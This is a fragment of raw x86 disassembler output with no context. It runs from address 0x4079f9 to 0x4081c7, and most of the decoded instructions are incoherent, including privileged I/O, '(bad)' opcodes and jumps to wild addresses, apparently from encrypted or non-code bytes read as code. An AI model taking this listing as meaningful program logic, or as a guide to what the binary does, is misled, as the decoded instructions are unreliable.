  4079f9:	jb     0x407a5c
  4079fb:	mov    bh,BYTE PTR [ebx]
  4079fd:	fwait
  4079fe:	iret   
  4079ff:	fimul  DWORD PTR [edi-0x3c05f3fa]
  407a05:	inc    ecx
  407a06:	push   ebx
  407a07:	xor    ch,BYTE PTR [ebx]
  407a09:	dec    ebp
  407a0a:	push   0xae142784
  407a0f:	pop    ss
  407a10:	push   eax
  407a11:	or     ebx,0xffffffd5
  407a14:	rcr    BYTE PTR [edi-0x2d4b7ff6],cl
  407a1a:	cmp    eax,0x469f97f4
  407a20:	jle    0x407a9f
  407a22:	mov    edi,0xaf0c38d9
  407a27:	lock jo 0x407a9f
  407a2a:	out    0x24,eax
  407a2c:	inc    ebx
  407a2d:	cmp    al,0x67
  407a2f:	and    eax,edi
  407a31:	adc    eax,0x2f307b23
  407a36:	jg     0x4079d8
  407a38:	pop    esp
  407a39:	pop    es
  407a3a:	iret   
  407a3b:	mov    dh,0x34
  407a3d:	imul   ebp,DWORD PTR [edx],0x447c541
  407a43:	repz push ss
  407a45:	mov    esp,0x3abe9466
  407a4a:	sub    eax,0x70928192
  407a4f:	dec    ecx
  407a50:	std    
  407a51:	jb     0x407ab0
  407a53:	jl     0x4079fd
  407a55:	xchg   esp,eax
  407a56:	cmp    al,BYTE PTR [ebx]
  407a58:	loop   0x407a56
  407a5a:	ret    
  407a5b:	inc    edx
  407a5c:	sbb    ebp,ebx
  407a5e:	call   0x7d668bd6
  407a63:	std    
  407a64:	cwde   
  407a65:	xchg   esp,eax
  407a66:	enter  0x8ed3,0xb1
  407a6a:	xchg   edi,eax
  407a6b:	dec    edi
  407a6c:	xor    eax,ebx
  407a6e:	jmp    0x407a84
  407a70:	je     0x407abc
  407a72:	ja     0x407a4d
  407a74:	mov    bh,BYTE PTR [eax]
  407a76:	pop    es
  407a77:	out    dx,al
  407a78:	pusha  
  407a79:	gs push cs
  407a7b:	inc    esp
  407a7c:	in     eax,0x5a
  407a7e:	pushf  
  407a7f:	les    ebx,FWORD PTR [ebx]
  407a81:	sbb    edi,DWORD PTR [ebx-0x5f]
  407a84:	push   ebx
  407a85:	or     eax,0x8b2d6487
  407a8a:	mov    esi,0x9ce88e30
  407a8f:	jae    0x407a8c
  407a91:	aad    0x1b
  407a93:	enter  0x65b,0x8d
  407a97:	xchg   edx,eax
  407a98:	test   eax,edx
  407a9a:	xor    eax,0xc2ac8d32
  407a9f:	push   eax
  407aa0:	jno    0x407a9f
  407aa2:	mov    dx,0xd9df
  407aa6:	aas    
  407aa7:	fimul  DWORD PTR [ecx]
  407aa9:	jle    0x407a4d
  407aab:	lock mov bl,0xe2
  407aae:	cmp    BYTE PTR ds:0xbcdd3d8f,bl
  407ab4:	(bad)  
  407ab5:	adc    DWORD PTR es:[esi-0x6e],ebp
  407ab9:	ja     0x407aa5
  407abb:	push   eax
  407abc:	jle    0x407aab
  407abe:	push   ds
  407abf:	inc    ebp
  407ac0:	(bad)  
  407ac1:	jno    0x407a8c
  407ac3:	push   edx
  407ac4:	push   ds
  407ac5:	jle    0x407ad4
  407ac7:	and    eax,0x5ccd80f4
  407acc:	pop    es
  407acd:	pop    esi
  407ace:	mov    ?,WORD PTR ds:0xf32b4053
  407ad4:	je     0x407b45
  407ad6:	mov    fs,ebp
  407ad8:	and    al,0xea
  407ada:	mov    esp,0x58caf507
  407adf:	sbb    al,0x3d
  407ae1:	in     eax,dx
  407ae2:	mov    ebx,0x6d1f78be
  407ae7:	rcr    DWORD PTR [ebx+0x5e],0x60
  407aeb:	sbb    bl,ch
  407aed:	aad    0x3e
  407aef:	call   0x84fe:0x6d913654
  407af6:	cmp    BYTE PTR [ecx+0x3722f419],bl
  407afc:	xor    al,0xfd
  407afe:	sbb    eax,0x570d4e67
  407b03:	rcl    BYTE PTR [edi-0x69],1
  407b06:	inc    esi
  407b07:	xchg   ecx,eax
  407b08:	jp     0x407b69
  407b0a:	jge    0x407aa2
  407b0c:	stos   BYTE PTR es:[edi],al
  407b0d:	dec    al
  407b0f:	cli    
  407b10:	inc    ecx
  407b11:	(bad)  
  407b12:	mov    ebp,0xc6331196
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	cld    
  407b40:	mov    ds:0xc95725af,al
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b0f
  407b4c:	pop    eax
  407b4d:	aas    
  407b4e:	jno    0x407b74
  407b50:	or     al,bh
  407b52:	nop
  407b53:	leave  
  407b54:	mov    bh,0x12
  407b56:	mov    ds:0xa17c6840,al
  407b5b:	out    0x5c,al
  407b5d:	arpl   WORD PTR ds:0x93d3fc42,sp
  407b63:	fnsave [edx-0x6fdf55f8]
  407b69:	sbb    al,BYTE PTR [edx-0xf]
  407b6c:	in     al,0xed
  407b6e:	lods   al,BYTE PTR ds:[esi]
  407b6f:	or     eax,0x433c36ed
  407b74:	leave  
  407b75:	inc    edx
  407b76:	stos   BYTE PTR es:[edi],al
  407b77:	ins    DWORD PTR es:[edi],dx
  407b78:	je     0x407b1e
  407b7a:	inc    esi
  407b7b:	push   es
  407b7c:	cwde   
  407b7d:	sub    BYTE PTR [ebp-0x570c764d],dh
  407b83:	mov    ebp,0x80876cf
  407b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b89:	inc    eax
  407b8a:	cmp    eax,0x1d3b2002
  407b8f:	in     eax,dx
  407b90:	pop    esi
  407b91:	xchg   esp,eax
  407b92:	in     al,0x92
  407b94:	(bad)  
  407b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b96:	int    0x59
  407b98:	ja     0x407be8
  407b9a:	mov    bl,0x56
  407b9c:	xchg   edi,eax
  407b9d:	cwde   
  407b9e:	push   edi
  407b9f:	ret    
  407ba0:	sub    esi,edx
  407ba2:	in     eax,dx
  407ba3:	mov    edi,0xc9d3a075
  407ba8:	add    dh,BYTE PTR [ecx+0x1ab79d84]
  407bae:	aam    0x78
  407bb0:	jg     0x407c1c
  407bb2:	push   ss
  407bb3:	js     0x407b8f
  407bb5:	sbb    DWORD PTR ds:0xfd857066,edx
  407bbb:	push   0x195bb5dd
  407bc0:	mov    edi,0x9634effb
  407bc5:	test   BYTE PTR [ebx-0x64c6c3f5],bh
  407bcb:	and    al,0x93
  407bcd:	xor    ecx,ebp
  407bcf:	mov    cl,0x67
  407bd1:	mov    edi,0x5dbe8d64
  407bd6:	jno    0x407b80
  407bd8:	xchg   edi,eax
  407bd9:	sbb    ah,BYTE PTR [esi]
  407bdb:	ds sbb bh,0x20
  407bdf:	leave  
  407be0:	fisttp WORD PTR [eax]
  407be2:	pushf  
  407be3:	push   edx
  407be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407be5:	push   ds
  407be6:	jns    0x407c01
  407be8:	and    al,0xd2
  407bea:	add    bl,BYTE PTR ds:0x145699a8
  407bf0:	cwde   
  407bf1:	mov    ch,0x47
  407bf3:	ins    DWORD PTR es:[edi],dx
  407bf4:	push   ss
  407bf5:	fs aam 0x43
  407bf8:	xor    bh,bl
  407bfa:	aaa    
  407bfb:	ret    
  407bfc:	push   cs
  407bfd:	pop    ss
  407bfe:	repnz cmp eax,0xacc7d6fd
  407c04:	out    0x6a,eax
  407c06:	xor    BYTE PTR fs:[ebx-0x36],bh
  407c0a:	push   ds
  407c0b:	mov    ecx,0x5655f66e
  407c10:	lahf   
  407c11:	inc    ecx
  407c12:	push   0x103514cb
  407c17:	out    0xf6,eax
  407c19:	bound  eax,QWORD PTR ds:0xd0aa2cb6
  407c1f:	fs shr ecx,0x8f
  407c23:	emms   
  407c25:	jb     0x407bfa
  407c27:	xor    eax,0xb7b97a4e
  407c2c:	mov    ecx,0xbfc723f0
  407c31:	imul   esi,DWORD PTR [esi-0x5075e42a],0xffffffdf
  407c38:	test   BYTE PTR [ebx-0x53],cl
  407c3b:	add    ecx,DWORD PTR [ecx]
  407c3d:	ret    0xeb0f
  407c40:	or     al,0xd4
  407c42:	imul   esp,esp,0xffffff84
  407c45:	mov    al,ds:0xcb5d2d90
  407c4a:	pop    edi
  407c4b:	jb     0x407bf4
  407c4d:	cli    
  407c4e:	stos   DWORD PTR es:[edi],eax
  407c4f:	(bad)  [ecx]
  407c51:	adc    eax,0x7c7e0d56
  407c56:	fld    DWORD PTR [eax-0x36f14f52]
  407c5c:	add    ecx,eax
  407c5e:	mov    dh,0x24
  407c60:	dec    ecx
  407c61:	je     0x407c4b
  407c63:	sti    
  407c64:	test   al,0x19
  407c66:	cmp    edx,DWORD PTR [ecx+0x69]
  407c69:	arpl   WORD PTR [esi+ecx*2+0x7a4b3fdb],si
  407c70:	push   esp
  407c71:	out    0xf5,eax
  407c73:	stos   BYTE PTR es:[edi],al
  407c74:	dec    ebp
  407c75:	stos   BYTE PTR es:[edi],al
  407c76:	shl    DWORD PTR [ebx],1
  407c78:	cmp    eax,0x71846f88
  407c7d:	mul    edx
  407c7f:	lods   eax,DWORD PTR ds:[esi]
  407c80:	mov    WORD PTR [eax],gs
  407c82:	mov    esp,0x230b3478
  407c87:	mov    ebp,0x1afaf428
  407c8c:	push   ds
  407c8d:	imul   ecx,DWORD PTR [edx+0x3c33389b],0x69416a54
  407c97:	test   al,0x79
  407c99:	js     0x407c1b
  407c9b:	int    0xa9
  407c9d:	cwde   
  407c9e:	(bad)  
  407c9f:	mov    dl,0x6
  407ca1:	pop    ebp
  407ca2:	adc    al,0x29
  407ca4:	xchg   ebp,eax
  407ca5:	jno    0x407c44
  407ca7:	xchg   ecx,eax
  407ca8:	dec    eax
  407ca9:	in     eax,0x61
  407cab:	pusha  
  407cac:	ss pop ebp
  407cae:	ret    
  407caf:	mov    al,0xaa
  407cb1:	push   ebx
  407cb2:	or     edi,DWORD PTR [edi+0x6374d964]
  407cb8:	xchg   esi,eax
  407cb9:	pop    eax
  407cba:	pop    cx
  407cbc:	retf   0x9aaa
  407cbf:	daa    
  407cc0:	stc    
  407cc1:	dec    eax
  407cc2:	xor    al,0x8d
  407cc4:	popf   
  407cc5:	daa    
  407cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cc7:	fist   DWORD PTR [esi+edx*8+0x2b]
  407ccb:	rcl    BYTE PTR [edx-0x6165a6d0],1
  407cd1:	sbb    al,0x1c
  407cd3:	jb     0x407d53
  407cd5:	jle    0x407cd9
  407cd7:	mov    bl,0xfd
  407cd9:	hlt    
  407cda:	lds    ebx,FWORD PTR [edx+0x1276fe04]
  407ce0:	mov    eax,0x44ec3b66
  407ce5:	mov    ss,esi
  407ce7:	mov    ebp,gs
  407ce9:	imul   esi,DWORD PTR [esi+0x59],0xdf2d6fae
  407cf0:	cmp    edi,DWORD PTR [edx+0x7a]
  407cf3:	or     esp,DWORD PTR [esi]
  407cf5:	mov    ecx,0x396e1d35
  407cfa:	push   esp
  407cfb:	cmp    eax,DWORD PTR [ecx-0xb395eee]
  407d01:	adc    DWORD PTR [ebx+eax*8],0x15
  407d05:	dec    edx
  407d06:	mov    eax,ds:0x90344dba
  407d0b:	cli    
  407d0c:	in     al,0xe0
  407d0e:	outs   dx,BYTE PTR ds:[esi]
  407d0f:	icebp  
  407d10:	jns    0x407cbe
  407d12:	mov    ecx,0x4f9450ad
  407d17:	inc    edx
  407d18:	jp     0x407cc8
  407d1a:	push   esi
  407d1b:	loopne 0x407d31
  407d1d:	and    edx,DWORD PTR [ebx-0x71410a3f]
  407d23:	inc    esi
  407d24:	loope  0x407cab
  407d26:	and    BYTE PTR [ecx],cl
  407d28:	mov    ebp,DWORD PTR [ecx]
  407d2a:	lods   eax,DWORD PTR ds:[esi]
  407d2b:	push   es
  407d2c:	(bad)  
  407d2d:	mov    esi,0xbc75e2d9
  407d32:	mov    edx,0x1988f486
  407d37:	fisub  WORD PTR [edi-0x71]
  407d3a:	fdivr  st(3),st
  407d3c:	leave  
  407d3d:	or     BYTE PTR [ebp+0x59],dl
  407d40:	scas   eax,DWORD PTR es:[edi]
  407d41:	cmc    
  407d42:	push   0xe0ed395c
  407d47:	ins    DWORD PTR es:[edi],dx
  407d48:	in     al,dx
  407d49:	fwait
  407d4a:	sub    cl,BYTE PTR [ecx]
  407d4c:	inc    esi
  407d4d:	mov    eax,0xa0ba6982
  407d52:	loopne 0x407da6
  407d54:	jmp    0xe665ec9d
  407d59:	or     al,0x98
  407d5b:	pop    ebp
  407d5c:	test   DWORD PTR [ebx],edx
  407d5e:	retf   0x764e
  407d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d62:	sub    edi,DWORD PTR [ebx+0x3caf88ef]
  407d68:	ret    0xee36
  407d6b:	cmp    al,BYTE PTR [eax+0x57]
  407d6e:	enter  0x5229,0x8e
  407d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d73:	ror    DWORD PTR [ebx-0x538bcc09],1
  407d79:	and    al,0x56
  407d7b:	fild   DWORD PTR [ebx-0x65]
  407d7e:	rol    DWORD PTR [edi+0x2527ffff],cl
  407d84:	ret    0xcb3f
  407d87:	inc    esi
  407d88:	jg     0x407d78
  407d8a:	pusha  
  407d8b:	cmp    DWORD PTR [eax],edi
  407d8d:	ss inc eax
  407d8f:	mov    ecx,0x748f8b45
  407d94:	fdiv   QWORD PTR [ebx-0x3795f655]
  407d9a:	ins    DWORD PTR es:[edi],dx
  407d9b:	cmp    DWORD PTR [ecx],0x53d9f11d
  407da1:	push   ds
  407da2:	adc    ch,BYTE PTR [ebx-0x6d0fde2e]
  407da8:	inc    ebp
  407da9:	inc    esi
  407daa:	xchg   esp,eax
  407dab:	jmp    0xd1af69a
  407db0:	push   cs
  407db1:	push   ecx
  407db2:	and    al,0x5c
  407db4:	fwait
  407db5:	(bad)  
  407db6:	lods   al,BYTE PTR ds:[esi]
  407db7:	add    ebp,DWORD PTR [edi]
  407db9:	or     eax,0x3cd2e45
  407dbe:	(bad)  
  407dbf:	sub    esp,DWORD PTR [edx+0x5691eb5a]
  407dc5:	cmp    dh,BYTE PTR [edx]
  407dc7:	loopne 0x407dc8
  407dc9:	ja     0x407d91
  407dcb:	int3   
  407dcc:	sub    al,0x2a
  407dce:	xchg   edx,eax
  407dcf:	xchg   edi,eax
  407dd0:	rsm    
  407dd2:	div    ebp
  407dd4:	pop    edx
  407dd5:	stc    
  407dd6:	or     edx,DWORD PTR [ebx+0x5e318b6]
  407ddc:	out    dx,eax
  407ddd:	mov    esi,0xc5d790a5
  407de2:	adc    eax,0xe9a0f6fd
  407de7:	sub    al,0x7b
  407de9:	mov    al,ds:0x37b0f4f2
  407dee:	sbb    DWORD PTR [ebp+0x75daadec],ebx
  407df4:	and    DWORD PTR [ebx+edi*8+0x54e360fb],0x37
  407dfc:	or     ah,BYTE PTR [ebp-0x5b0c229a]
  407e02:	repz int3 
  407e04:	adc    esi,DWORD PTR [esi+0x3f6ace3c]
  407e0a:	cmp    eax,edx
  407e0c:	jbe    0x407e1e
  407e0e:	hlt    
  407e0f:	mov    bl,0xe8
  407e11:	adc    DWORD PTR [ecx+ecx*2],esi
  407e14:	xchg   ecx,eax
  407e15:	pop    esp
  407e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e17:	out    dx,eax
  407e18:	std    
  407e19:	jecxz  0x407da8
  407e1b:	jnp    0x407da2
  407e1d:	shl    DWORD PTR [ecx+0x40c9b457],0x1b
  407e24:	out    dx,al
  407e25:	inc    ebp
  407e26:	cmp    eax,0xb2bc125e
  407e2b:	xchg   ch,bl
  407e2d:	jg     0x407e91
  407e2f:	loop   0x407e26
  407e31:	dec    edi
  407e32:	scas   al,BYTE PTR es:[edi]
  407e33:	retf   
  407e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e35:	sbb    eax,0x26a4b669
  407e3a:	stos   DWORD PTR es:[edi],eax
  407e3b:	jmp    FWORD PTR [esi]
  407e3d:	int    0xb
  407e3f:	mov    eax,0x1937c30b
  407e44:	(bad)  
  407e45:	lahf   
  407e46:	adc    ebp,DWORD PTR [ebx-0x37]
  407e49:	jbe    0x407deb
  407e4b:	ficom  DWORD PTR [ebp+esi*8+0x4979acd7]
  407e52:	sbb    DWORD PTR [edx+0x36],edi
  407e55:	pop    ecx
  407e56:	in     eax,0xa8
  407e58:	jg     0x407e69
  407e5a:	ds sub eax,0x53182f54
  407e60:	stos   DWORD PTR es:[edi],eax
  407e61:	popf   
  407e62:	fist   DWORD PTR [esi-0x136edfab]
  407e68:	aam    0x69
  407e6a:	jb     0x407ebc
  407e6c:	int3   
  407e6d:	xor    BYTE PTR [esi-0x345011f3],ch
  407e73:	cmp    eax,0xafcf7d2e
  407e78:	sbb    DWORD PTR [eax-0x5b],0xffffffe8
  407e7c:	cmp    esp,DWORD PTR [edx+0x45890000]
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	mov    bl,0x55
  407e9a:	sbb    BYTE PTR [esi+0x7070d507],0x20
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407ed6
  407ea5:	xchg   esi,eax
  407ea6:	jo     0x407efb
  407ea8:	icebp  
  407ea9:	je     0x407e46
  407eab:	sbb    dl,ah
  407ead:	aaa    
  407eae:	cwde   
  407eaf:	jmp    0x407ed8
  407eb1:	dec    ebx
  407eb2:	adc    DWORD PTR [eax+0x7f905f0],ecx
  407eb8:	stc    
  407eb9:	out    dx,eax
  407eba:	inc    edi
  407ebb:	mov    esp,0x9f585c68
  407ec0:	popa   
  407ec1:	push   ebp
  407ec2:	sbb    al,BYTE PTR [edi]
  407ec4:	das    
  407ec5:	test   al,0x43
  407ec7:	aad    0x52
  407ec9:	sbb    DWORD PTR [edx-0x61],ebx
  407ecc:	add    DWORD PTR [esi],0xa1d94e46
  407ed2:	add    cl,BYTE PTR [edi-0x27545949]
  407ed8:	dec    esi
  407ed9:	push   0xffffff91
  407edb:	xchg   ecx,eax
  407edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407edd:	adc    ebx,ebx
  407edf:	je     0x407f3e
  407ee1:	cmp    ebp,DWORD PTR [eax-0x13b24558]
  407ee7:	outs   dx,DWORD PTR ds:[esi]
  407ee8:	push   eax
  407ee9:	inc    ecx
  407eea:	stos   DWORD PTR es:[edi],eax
  407eeb:	mov    ah,0xb8
  407eed:	sahf   
  407eee:	and    BYTE PTR [ecx],al
  407ef0:	lods   eax,DWORD PTR ds:[esi]
  407ef1:	in     eax,0xbc
  407ef3:	jno    0x407efc
  407ef5:	bound  esp,QWORD PTR [ecx+eiz*8+0x5bc480b1]
  407efc:	ffree  st(6)
  407efe:	jl     0x407e81
  407f00:	imul   ebp,DWORD PTR [edi],0x6cb32311
  407f06:	in     al,0x8f
  407f08:	aaa    
  407f09:	jae    0x407f77
  407f0b:	jecxz  0x407f1e
  407f0d:	push   es
  407f0e:	push   edx
  407f0f:	push   ebx
  407f10:	xchg   esi,eax
  407f11:	xlat   BYTE PTR ds:[ebx]
  407f12:	aas    
  407f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f14:	push   edi
  407f15:	adc    BYTE PTR [esp+edi*1],ch
  407f18:	and    al,0xca
  407f1a:	xchg   ecx,eax
  407f1b:	ja     0x407f38
  407f1d:	sub    esp,DWORD PTR [edi]
  407f1f:	jnp    0x407f09
  407f21:	add    ebx,DWORD PTR [bx]
  407f24:	loopne 0x407f40
  407f26:	js     0x407eeb
  407f28:	call   0x3ea2aa2a
  407f2d:	mov    edi,?
  407f2f:	fisub  WORD PTR [ecx+0x273df3db]
  407f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f36:	call   0xa437:0x3de496e9
  407f3d:	dec    esp
  407f3e:	sbb    esp,DWORD PTR [esi+0x68]
  407f41:	inc    ecx
  407f42:	lahf   
  407f43:	retf   
  407f44:	in     eax,0x2b
  407f46:	add    al,0xbf
  407f48:	jns    0x407fa9
  407f4a:	out    0x26,eax
  407f4c:	cwde   
  407f4d:	rcr    edi,0x19
  407f50:	scas   al,BYTE PTR es:[edi]
  407f51:	cmp    ebx,DWORD PTR [ebp-0x586f353f]
  407f57:	imul   ebx,DWORD PTR [esi+0x3314ce8f],0x6f
  407f5e:	push   0x3c45da72
  407f63:	pop    edi
  407f64:	fimul  DWORD PTR [edx+0x672e43ea]
  407f6a:	dec    esi
  407f6b:	stos   BYTE PTR es:[edi],al
  407f6c:	(bad)
  407f70:	repnz xchg ebp,eax
  407f72:	mov    ah,0xca
  407f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f75:	loopne 0x407f34
  407f77:	mov    al,ds:0x14d98392
  407f7c:	inc    ebp
  407f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f7e:	add    DWORD PTR [ebx-0x152fc3d9],0xffffffa2
  407f85:	add    al,dh
  407f87:	push   es
  407f88:	cli    
  407f89:	dec    ebx
  407f8a:	inc    edi
  407f8b:	mov    ch,BYTE PTR [edx+0x351b4403]
  407f91:	mov    ebp,0xca96b7a6
  407f96:	mov    edi,0x2511c1be
  407f9b:	pop    edx
  407f9c:	push   edi
  407f9d:	rcl    BYTE PTR [esi],0x0
  407fa0:	ret    
  407fa1:	lock dec eax
  407fa3:	or     al,0xff
  407fa5:	mov    cl,0x83
  407fa7:	jg     0x407f93
  407fa9:	add    al,0xc
  407fab:	push   esi
  407fac:	mov    dh,0xe8
  407fae:	pop    es
  407faf:	mov    ebp,DWORD PTR [esi+0x64b1c431]
  407fb5:	xchg   ebp,eax
  407fb6:	imul   BYTE PTR [edi+0x1c98b8f8]
  407fbc:	sbb    eax,0x4669a141
  407fc1:	ja     0x407fc2
  407fc3:	scas   eax,DWORD PTR es:[edi]
  407fc4:	mov    al,ds:0x661bcbf4
  407fc9:	xchg   esi,eax
  407fca:	add    cl,BYTE PTR [edx+0x45937949]
  407fd0:	pop    esi
  407fd1:	cli    
  407fd2:	int3   
  407fd3:	xor    al,0xa7
  407fd5:	push   es
  407fd6:	clc    
  407fd7:	push   ebx
  407fd8:	fwait
  407fd9:	inc    ebp
  407fda:	test   al,0x36
  407fdc:	inc    edx
  407fdd:	add    DWORD PTR [eax],esp
  407fdf:	xlat   BYTE PTR ds:[ebx]
  407fe0:	sbb    ecx,DWORD PTR [ecx+0x3b]
  407fe3:	std    
  407fe4:	ja     0x407ff1
  407fe6:	jns    0x407fa9
  407fe8:	mov    bl,ah
  407fea:	leave  
  407feb:	scas   eax,DWORD PTR es:[edi]
  407fec:	aad    0x92
  407fee:	inc    ebp
  407fef:	mov    esi,0x9098dddc
  407ff4:	xor    dh,BYTE PTR [esi]
  407ff6:	push   es
  407ff7:	sbb    eax,0x8562818d
  407ffc:	and    edx,0xffffffaa
  407fff:	mov    ds:0xdc8e7954,eax
  408004:	mov    ecx,0xbf133b17
  408009:	cmp    eax,0x39f7c0f3
  40800e:	fdivr  DWORD PTR [esi]
  408010:	mov    esi,DWORD PTR ds:0xb9e85fc6
  408016:	xor    DWORD PTR [edi],ebx
  408018:	shl    BYTE PTR [edx+0x58],1
  40801b:	xchg   ebx,eax
  40801c:	mov    esi,0x67c90f46
  408021:	shl    BYTE PTR [esi-0x29],cl
  408024:	xor    esi,DWORD PTR [ebp+0x78]
  408027:	(bad)  
  408028:	aam    0x65
  40802a:	mov    ebp,0x3ed9d42f
  40802f:	mov    ebp,0x6091fbf8
  408034:	sub    BYTE PTR [eax-0x42],dl
  408037:	loop   0x40805c
  408039:	xchg   edi,eax
  40803a:	or     DWORD PTR [eax+edi*2+0x714cfd5f],ebx
  408041:	(bad)  
  408042:	adc    DWORD PTR [edx],edx
  408044:	mov    bl,0xfa
  408046:	aaa    
  408047:	pop    es
  408048:	fisubr WORD PTR [ecx]
  40804a:	mov    edi,0x84310959
  40804f:	js     0x4080b0
  408051:	in     eax,0x21
  408053:	scas   al,BYTE PTR es:[edi]
  408054:	push   0xffffffe6
  408056:	pop    ecx
  408057:	es or  al,0xaa
  40805a:	jl     0x407ffc
  40805c:	dec    esp
  40805d:	pusha  
  40805e:	stc    
  40805f:	or     eax,0x95fc21cd
  408064:	call   0x39ff:0x6420092
  40806b:	adc    al,0x1b
  40806d:	gs inc ecx
  40806f:	leave  
  408070:	js     0x4080b2
  408072:	fwait
  408073:	mov    ebx,0x9b85b948
  408078:	(bad)  
  408079:	pop    eax
  40807a:	shl    BYTE PTR [ebx],cl
  40807c:	mov    al,0xfa
  40807e:	dec    edx
  40807f:	cs ss cwde 
  408082:	pop    ss
  408083:	pop    edx
  408084:	mov    ebp,0xa948b363
  408089:	mov    WORD PTR [ebx],ds
  40808b:	jne    0x408104
  40808d:	(bad)  [ebx-0x54]
  408090:	ss jle 0x408027
  408093:	mov    ds:0xcfeb73cf,eax
  408098:	shr    BYTE PTR [eax+0x88629a3],0x50
  40809f:	(bad)
  4080a3:	mov    ds:0xde230325,al
  4080a8:	neg    DWORD PTR [ebp+0xe]
  4080ab:	add    DWORD PTR [edi],ecx
  4080ad:	test   eax,0xec9c1753
  4080b2:	loope  0x4080ce
  4080b4:	adc    ch,BYTE PTR [ecx+ecx*1-0x5]
  4080b8:	xor    edi,ebp
  4080ba:	loope  0x408094
  4080bc:	divps  xmm2,xmm4
  4080bf:	adc    dl,BYTE PTR [edi+0x5ab551af]
  4080c5:	(bad)  [ecx+eax*4]
  4080c8:	or     DWORD PTR [ebp+0x29e9321d],ebx
  4080ce:	test   eax,0x5e37de18
  4080d3:	and    DWORD PTR ds:0x6678d3be,ecx
  4080d9:	(bad)  
  4080da:	cld    
  4080db:	mov    ecx,0xb59adae4
  4080e0:	bnd jle 0x408077
  4080e3:	das    
  4080e4:	addr16 push ebx
  4080e6:	daa    
  4080e7:	mov    eax,ds:0x5c57191a
  4080ec:	aad    0x16
  4080ee:	push   es
  4080ef:	popa   
  4080f0:	test   eax,0xc23f5361
  4080f5:	fiadd  DWORD PTR [eax+0x47]
  4080f8:	adc    ebx,esi
  4080fa:	xchg   ebx,eax
  4080fb:	sub    edi,DWORD PTR [eax+0x2a]
  4080fe:	test   BYTE PTR [eax+0x6],ch
  408101:	add    BYTE PTR [ebp+eax*4-0xd625be7],0x1
  408109:	or     edi,esi
  40810b:	fstp   QWORD PTR [edi+0x2c13cbf3]
  408111:	rol    DWORD PTR [ecx-0x20],1
  408114:	jecxz  0x4080d4
  408116:	aad    0x1b
  408118:	mov    al,0x23
  40811a:	jns    0x4080cc
  40811c:	fs mov eax,0x354d41d8
  408122:	xchg   ebp,eax
  408123:	aas    
  408124:	loope  0x408127
  408126:	jg     0x40812a
  408128:	or     edi,DWORD PTR [eax+ebp*8-0x80]
  40812c:	xlat   BYTE PTR ds:[ebx]
  40812d:	push   ebx
  40812e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40812f:	pop    ebp
  408130:	das    
  408131:	test   DWORD PTR [edx-0x7192441d],esp
  408137:	ds pop esp
  408139:	daa    
  40813a:	or     ah,ah
  40813c:	outs   dx,DWORD PTR ds:[esi]
  40813d:	in     al,0x40
  40813f:	call   0xe0bb:0x573a76c9
  408146:	sahf   
  408147:	push   eax
  408148:	jnp    0x4080fd
  40814a:	fadd   DWORD PTR [eax+0x3b]
  40814d:	hlt    
  40814e:	rcl    BYTE PTR ds:0xa6b4fff4,1
  408154:	call   0x92a3b2a
  408159:	daa    
  40815a:	lock mov dl,0x3a
  40815d:	test   BYTE PTR [esi],0x54
  408160:	sub    eax,0x213ed4f5
  408165:	jecxz  0x4081a9
  408167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408168:	sbb    DWORD PTR [ecx-0x18],esp
  40816b:	mov    esp,0x859139af
  408170:	ficom  DWORD PTR ds:0x523c0833
  408176:	outs   dx,BYTE PTR ds:[esi]
  408177:	mov    al,0x70
  408179:	add    ecx,DWORD PTR [eax+eax*2-0x25]
  40817d:	xor    DWORD PTR [eax-0x277e7082],edx
  408183:	mov    ah,0x25
  408185:	mov    dl,0xa8
  408187:	ret    0x7379
  40818a:	mov    cl,0xce
  40818c:	or     eax,ecx
  40818e:	loope  0x408154
  408190:	mov    dh,0x15
  408192:	push   ecx
  408193:	fs call 0x60590bff
  408199:	mov    ds:0xb88396c4,eax
  40819e:	fucom  st(4)
  4081a0:	loop   0x40815a
  4081a2:	sub    BYTE PTR [edi-0x38],ch
  4081a5:	ret    0xdfc5
  4081a8:	fdiv   DWORD PTR [edx]
  4081aa:	inc    edx
  4081ab:	inc    DWORD PTR [esi+0x5c]
  4081ae:	leave  
  4081af:	jge    0x408140
  4081b1:	ror    DWORD PTR [ecx],1
  4081b3:	mov    edi,0x3df1acaf
  4081b8:	mov    al,ds:0xfb0dd30
  4081bd:	and    al,0xf7
  4081bf:	pop    eax
  4081c0:	mov    ds:0x992b5502,eax
  4081c5:	cs popf 
  4081c7:	mov    esp,0xf235641f
